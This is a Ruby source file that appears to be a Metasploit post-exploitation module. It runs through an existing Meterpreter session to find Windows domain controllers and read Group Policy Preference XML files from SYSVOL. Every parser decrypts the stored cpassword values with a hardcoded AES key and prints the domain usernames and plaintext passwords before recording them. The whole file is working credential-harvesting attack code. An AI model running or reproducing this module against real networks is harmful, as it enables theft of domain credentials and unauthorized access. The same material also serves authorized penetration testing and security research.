##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'rex'
require 'rexml/document'

class Metasploit3 < Msf::Post
	include Msf::Auxiliary::Report
	include Msf::Post::Windows::Priv

	def initialize(info={})
		super( update_info( info,
			'Name'          => 'Windows Gather Group Policy Preferences Saved Password Extraction',
			'Description'   => %q{
				This module enumerates the victim machine's domain controller and
				connects to it via SMB. It then looks for Group Policy Preference XML
				files containing local user accounts and passwords. It then parses the
				XML files and decrypts the passwords.

				Users can specify DOMAINS="domain1 domain2 domain3 etc" to target specific
				domains on the network. This module will enumerate any domain controllers for
				those domains.

				Users can specify ALL=True to target all domains and their domain controllers
				on the network.
			},
			'License'       => MSF_LICENSE,
			'Author'        =>[
				'TheLightCosine <thelightcosine[at]gmail.com>',
				'Meatballs <eat_meatballs[at]hotmail.co.uk>',
				'Loic Jaquemet <loic.jaquemet+msf[at]gmail.com>',
				'Rob Fuller <mubix[at]hak5.org>', #domain/dc enumeration code
				'Joshua Abraham <jabra[at]rapid7.com>' #enum_domain.rb code
				],
			'References'    =>
				[
					['URL', 'http://esec-pentest.sogeti.com/exploiting-windows-2008-group-policy-preferences'],
					['URL', 'http://msdn.microsoft.com/en-us/library/cc232604(v=prot.13)'],
					['URL', 'http://rewtdance.blogspot.com/2012/06/exploiting-windows-2008-group-policy.html'],
					['URL', 'http://blogs.technet.com/grouppolicy/archive/2009/04/22/passwords-in-group-policy-preferences-updated.aspx']
				],
			'Platform'      => [ 'windows' ],
			'SessionTypes'  => [ 'meterpreter' ]
		))

		register_options(
			[
				OptBool.new('CURRENT', [ false, 'Enumerate current machine domain.', true]),
				OptBool.new('ALL', [ false, 'Enumerate all domains on network.', false]),
				OptString.new('DOMAINS', [false, 'Enumerate list of space seperated domains - DOMAINS="domain1 domain2 etc".']),
			], self.class)
	end

	def run
		dcs = []
		group_paths = []
		group_path = "MACHINE\\Preferences\\Groups\\Groups.xml"
		group_path_user = "USER\\Preferences\\Groups\\Groups.xml"
		service_paths = []
		service_path = "MACHINE\\Preferences\\Services\\Services.xml"
		printer_paths = []
		printer_path = "USER\\Preferences\\Printers\\Printers.xml"
		drive_paths = []
		drive_path = "USER\\Preferences\\Drives\\Drives.xml"
		datasource_paths = []
		datasource_path = "MACHINE\\Preferences\\Datasources\\DataSources.xml"
		datasource_path_user = "USER\\Preferences\\Datasources\\DataSources.xml"
		task_paths = []
		task_path = "MACHINE\\Preferences\\ScheduledTasks\\ScheduledTasks.xml"
		task_path_user = "USER\\Preferences\\ScheduledTasks\\ScheduledTasks.xml"

		if !datastore['DOMAINS'].to_s.empty?
			user_domains = datastore['DOMAINS'].to_s.split(' ')
			print_status "User supplied domains #{user_domains}"

			user_domains.each do |domain_name|
				found_dcs = enum_dcs(domain_name)
				dcs << found_dcs[0] unless found_dcs.to_a.empty?
			end
		elsif datastore['ALL']
			enum_domains.each do |domain|
				domain_name = domain[:domain]
				if  domain_name == "WORKGROUP" || domain_name.empty?
					print_status "Skipping '#{domain_name}'..."
					next
				end

				found_dcs = enum_dcs(domain_name)
				# We only wish to enumerate one DC for each Domain.
				dcs << found_dcs[0] unless found_dcs.to_a.empty?
			end
		elsif datastore['CURRENT']
			dcs << get_domain_controller
		else
			print_error "Invalid Arguments, please supply one of CURRENT, ALL or DOMAINS arguments"
			return nil
		end

		dcs = dcs.flatten.compact
		dcs.each do |dc|
			print_status "Searching on #{dc}..."
			sysvol_path = "\\\\#{dc}\\SYSVOL\\"
			begin
				# Enumerate domain folders
				session.fs.dir.foreach(sysvol_path) do |domain_dir|
					next if domain_dir =~ /^(\.|\.\.)$/
					domain_path = "#{sysvol_path}#{domain_dir}\\Policies\\"
					print_status "Looking in domain folder #{domain_path}"
					# Enumerate policy folders {...}
					begin
						session.fs.dir.foreach(domain_path) do |policy_dir|
							next if policy_dir =~ /^(\.|\.\.)$/
							policy_path = "#{domain_path}\\#{policy_dir}"
							group_paths << find_path(policy_path, group_path)
							group_paths << find_path(policy_path, group_path_user)
							service_paths << find_path(policy_path, service_path)
							printer_paths << find_path(policy_path, printer_path)
							drive_paths << find_path(policy_path, drive_path)
							datasource_paths << find_path(policy_path, datasource_path)
							datasource_paths << find_path(policy_path, datasource_path_user)
							task_paths << find_path(policy_path, task_path)
							task_paths << find_path(policy_path, task_path_user)
						end
					rescue Rex::Post::Meterpreter::RequestError => e
						print_error "Received error code #{e.code} when reading #{domain_path}"
					end
				end
			rescue Rex::Post::Meterpreter::RequestError => e
				print_error "Received error code #{e.code} when reading #{sysvol_path}"
			end
		end

		group_paths = group_paths.flatten.compact
		service_paths = service_paths.flatten.compact
		printer_paths = printer_paths.flatten.compact
		drive_paths = drive_paths.flatten.compact
		datasource_paths = datasource_paths.flatten.compact
		task_paths = task_paths.flatten.compact

		print_status "Results from Groups.xml:"
		group_paths.each do |path|
			mxml, dc = get_xml(path)
			parse_group_xml(mxml, dc)
		end

		print_status "Results from Services.xml:"
		service_paths.each do |path|
			mxml, dc = get_xml(path)
			parse_service_xml(mxml, dc)
		end

		print_status "Results from Printers.xml:"
		printer_paths.each do |path|
			mxml, dc = get_xml(path)
			parse_printer_xml(mxml, dc)
		end

		print_status "Results from Drives.xml:"
		drive_paths.each do |path|
			mxml, dc = get_xml(path)
			parse_drive_xml(mxml, dc)
		end

		print_status "Results from DataSources.xml:"
		datasource_paths.each do |path|
			mxml, dc = get_xml(path)
			parse_datasource_xml(mxml, dc)
		end

		print_status "Results from ScheduledTasks.xml:"
		task_paths.each do |path|
			mxml, dc = get_xml(path)
			parse_scheduled_task_xml(mxml, dc)
		end
	end

	def find_path(path, xml_path)
		xml_path = "#{path}\\#{xml_path}"
		begin
			return xml_path if client.fs.file.stat(xml_path)
		rescue Rex::Post::Meterpreter::RequestError => e
			# No permissions for this specific file.
			return nil
		end
	end

	def get_xml(path)
		begin
			groups = client.fs.file.new(path,'r')
			until groups.eof
				data = groups.read
			end

			domain = path.split('\\')[2]

			mxml = REXML::Document.new(data).root

			return mxml, domain
		rescue Rex::Post::Meterpreter::RequestError => e
				print_error "Received error code #{e.code} when reading #{path}"
		end
	end

	def parse_service_xml(mxml,domain_controller)
		mxml.elements.to_a("//Properties").each do |node|
			epassword = node.attributes['cpassword']
			next if epassword.to_s.empty?

			user = node.attributes['accountName']
			service_name = node.attributes['serviceName']

			changed = node.parent.attributes['changed']

			pass = decrypt(epassword)

			print_good "DOMAIN CONTROLLER: #{domain_controller} USER: #{user} PASS: #{pass} SERVICE: #{service_name} CHANGED: #{changed}"
			report_creds(user,pass)
		end
	end

	def parse_printer_xml(mxml,domain_controller)
		mxml.elements.to_a("//Properties").each do |node|
			epassword = node.attributes['cpassword']
			next if epassword.to_s.empty?

			user = node.attributes['userName']
			path = node.attributes['path']

			changed = node.parent.attributes['changed']

			pass = decrypt(epassword)

			print_good "DOMAIN CONTROLLER: #{domain_controller} USER: #{user} PASS: #{pass} PATH: #{path} CHANGED: #{changed}"
			report_creds(user,pass)
		end
	end

	def parse_drive_xml(mxml,domain_controller)
		mxml.elements.to_a("//Properties").each do |node|
			epassword = node.attributes['cpassword']
			next if epassword.to_s.empty?

			user = node.attributes['userName']
			path = node.attributes['path']

			changed = node.parent.attributes['changed']

			pass = decrypt(epassword)

			print_good "DOMAIN CONTROLLER: #{domain_controller} USER: #{user} PASS: #{pass} PATH: #{path} CHANGED: #{changed}"
			report_creds(user,pass)
		end
	end

	def parse_datasource_xml(mxml,domain_controller)
		mxml.elements.to_a("//Properties").each do |node|
			epassword = node.attributes['cpassword']
			next if epassword.to_s.empty?

			user = node.attributes['userName']
			dsn = node.attributes['dsn']

			changed = node.parent.attributes['changed']

			pass = decrypt(epassword)

			print_good "DOMAIN CONTROLLER: #{domain_controller} USER: #{user} PASS: #{pass} DSN: #{dsn} CHANGED: #{changed}"
			report_creds(user,pass)
		end
	end

	def parse_scheduled_task_xml(mxml,domain_controller)
		mxml.elements.to_a("//Properties").each do |node|
			epassword = node.attributes['cpassword']
			next if epassword.to_s.empty?

			user = node.attributes['runAs']
			task_name = node.attributes['name']

			changed = node.parent.attributes['changed']

			pass = decrypt(epassword)

			print_good "DOMAIN CONTROLLER: #{domain_controller} USER: #{user} PASS: #{pass} Task: #{task_name} CHANGED: #{changed}"
			report_creds(user,pass)
		end
	end

	def parse_group_xml(mxml,domain_controller)
		mxml.elements.to_a("//Properties").each do |node|
			epassword = node.attributes['cpassword']
			next if epassword.to_s.empty?

			user = node.attributes['userName']
			newname = node.attributes['newName']
			disabled = node.attributes['acctDisabled']
			action = node.attributes['action']
			expires = node.attributes['expires']
			never_expires = node.attributes['neverExpires']
			description = node.attributes['description']
			full_name = node.attributes['fullName']
			no_change = node.attributes['noChange']
			change_logon = node.attributes['changeLogon']
			sub_authority = node.attributes['subAuthority']

			changed = node.parent.attributes['changed']

			# Check if policy also specifies the user is renamed.
			if !newname.to_s.empty?
				user = newname
			end

			pass = decrypt(epassword)

			print_good "DOMAIN CONTROLLER: #{domain_controller} USER: #{user} PASS: #{pass} DISABLED: #{disabled} CHANGED: #{changed}"

			report_creds(user,pass)
		end
	end

	def report_creds(user, pass)
		if session.db_record
			source_id = session.db_record.id
		else
			source_id = nil
		end

		report_auth_info(
			:host  => session.sock.peerhost,
			:port => 445,
			:sname => 'smb',
			:proto => 'tcp',
			:source_id => source_id,
			:source_type => "exploit",
			:user => user,
			:pass => pass)
	end

	def decrypt(encrypted_data)
		padding = "=" * (4 - (encrypted_data.length % 4))
		epassword = "#{encrypted_data}#{padding}"
		decoded = Rex::Text.decode_base64(epassword)

		key = "\x4e\x99\x06\xe8\xfc\xb6\x6c\xc9\xfa\xf4\x93\x10\x62\x0f\xfe\xe8\xf4\x96\xe8\x06\xcc\x05\x79\x90\x20\x9b\x09\xa4\x33\xb6\x6c\x1b"
		aes = OpenSSL::Cipher::Cipher.new("AES-256-CBC")
		aes.decrypt
		aes.key = key
		plaintext = aes.update(decoded)
		plaintext << aes.final
		pass = plaintext.unpack('v*').pack('C*') # UNICODE conversion

		return pass
	end

	#enum_domains.rb
	def enum_domains
		print_status "Enumerating Domains on the Network..."
		domain_enum = 0x80000000 # SV_TYPE_DOMAIN_ENUM
		buffersize = 500
		result = client.railgun.netapi32.NetServerEnum(nil,100,4,buffersize,4,4,domain_enum,nil,nil)
		# Estimate new buffer size on percentage recovered.
		percent_found = (result['entriesread'].to_f/result['totalentries'].to_f)
		if percent_found > 0
			buffersize = (buffersize/percent_found).to_i
		else
			buffersize += 500
		end

		while result['return'] == 234
			buffersize = buffersize + 500
			result = client.railgun.netapi32.NetServerEnum(nil,100,4,buffersize,4,4,domain_enum,nil,nil)
		end

		count = result['totalentries']
		print_status("#{count} domain(s) found.")
		startmem = result['bufptr']

		base = 0
		domains = []
		mem = client.railgun.memread(startmem, 8*count)
		count.times do |i|
				x = {}
				x[:platform] = mem[(base + 0),4].unpack("V*")[0]
				nameptr = mem[(base + 4),4].unpack("V*")[0]
				x[:domain] = client.railgun.memread(nameptr,255).split("\0\0")[0].split("\0").join
				domains << x
				base = base + 8
		end

		return domains
	end

	#enum_domains.rb
	def enum_dcs(domain)
		print_status("Enumerating DCs for #{domain}")
		domaincontrollers = 24  # 10 + 8 (SV_TYPE_DOMAIN_BAKCTRL || SV_TYPE_DOMAIN_CTRL)
		buffersize = 500
		result = client.railgun.netapi32.NetServerEnum(nil,100,4,buffersize,4,4,domaincontrollers,domain,nil)
		while result['return'] == 234
			buffersize = buffersize + 500
			result = client.railgun.netapi32.NetServerEnum(nil,100,4,buffersize,4,4,domaincontrollers,domain,nil)
		end
		if result['totalentries'] == 0
			print_error "No Domain Controllers found for #{domain}"
			return nil
		end

		count = result['totalentries']
		startmem = result['bufptr']

		base = 0
		mem = client.railgun.memread(startmem, 8*count)
		hostnames = []
		count.times do |i|
			t = {}
			t[:platform] = mem[(base + 0),4].unpack("V*")[0]
			nameptr = mem[(base + 4),4].unpack("V*")[0]
			t[:dc_hostname] = client.railgun.memread(nameptr,255).split("\0\0")[0].split("\0").join
			base = base + 8
			print_good "DC Found: #{t[:dc_hostname]}"
			hostnames << t[:dc_hostname]
		end

		return hostnames
	end

	#enum_domain.rb
	def reg_getvaldata(key,valname)
		value = nil
		begin
			root_key, base_key = client.sys.registry.splitkey(key)
			open_key = client.sys.registry.open_key(root_key, base_key, KEY_READ)
			v = open_key.query_value(valname)
			value = v.data
			open_key.close
		rescue Rex::Post::Meterpreter::RequestError => e
			print_error "Received error code #{e.code} - #{e.message} when reading the registry."
		end

		return value
	end

	#enum_domain.rb
	def get_domain_controller()
		domain = nil
		begin
			subkey = "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Group Policy\\History"
			v_name = "DCName"
			domain = reg_getvaldata(subkey, v_name)
		rescue Rex::Post::Meterpreter::RequestError => e
			print_error "Received error code #{e.code} - #{e.message} when reading the registry."
		end

		if domain.nil?
			print_error "No domain controller retrieved - is this machine part of a domain?"
			return nil
		else
			return domain.sub!(/\\\\/,'')
		end
	end
end

